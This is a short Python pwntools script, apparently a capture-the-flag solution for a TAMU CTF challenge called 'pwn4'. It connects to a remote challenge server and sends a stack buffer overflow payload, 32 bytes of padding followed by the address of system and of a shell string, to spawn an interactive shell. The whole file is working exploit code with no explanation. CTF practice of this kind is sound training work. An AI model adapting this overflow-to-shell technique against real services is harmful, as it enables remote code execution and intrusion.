#!/usr/bin/env python

from pwn import *

r = remote('pwn.ctf.tamu.edu', 4324)
# r = process('./pwn4')

system = 0x08048430
shell = 0x0804A038

r.recvuntil('Input> ')
r.sendline('1')
r.recvuntil('Input> ')
r.sendline('a' * 32 + p32(system) + 'a' * 4 + p32(shell))

r.interactive()
